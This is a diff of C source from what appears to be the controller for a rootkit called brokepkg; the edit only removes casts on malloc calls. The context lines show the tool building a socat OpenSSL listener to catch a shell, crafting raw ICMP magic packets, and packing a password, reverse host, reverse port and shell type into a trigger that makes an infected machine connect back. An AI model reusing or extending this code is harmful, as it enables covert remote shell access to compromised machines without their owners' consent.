@@ -54,7 +54,7 @@ void invoke_lister(const char *port) {
     system(openssl_create_key);
     system(join_keys);
   }
-  char *socat_lister = (char *)malloc((80 + strlen(port)) * sizeof(char));
+  char *socat_lister = malloc((80 + strlen(port)) * sizeof(char));
   strcpy(socat_lister, "socat file:`tty`,raw,echo=0 openssl-listen:");
   strcat(socat_lister, port);
   strcat(socat_lister, ",cert=/tmp/brokepkg.pem,verify=0,fork");
@@ -97,7 +97,7 @@ int icmp(char *srcip, char *dstip, int magic_number, char *data) {
 
   pckt_tam = (sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len);
 
-  if (!(buffer = (char *)malloc(pckt_tam))) {
+  if (!(buffer = malloc(pckt_tam))) {
     printf(BAD "error on allocating buffer memory");
     return ret;
   }
@@ -233,7 +233,7 @@ int main(int argc, char *argv[]) {
 
   int len =
       strlen(pass) + strlen(rev_host) + strlen(rev_port) + strlen(shell_t) + 4;
-  data = (char *)malloc(len * sizeof(char));
+  data = malloc(len * sizeof(char));
 
   bzero(data, len);
   snprintf(data, len, "%s %s %s %s", pass, rev_host, rev_port, shell_t);
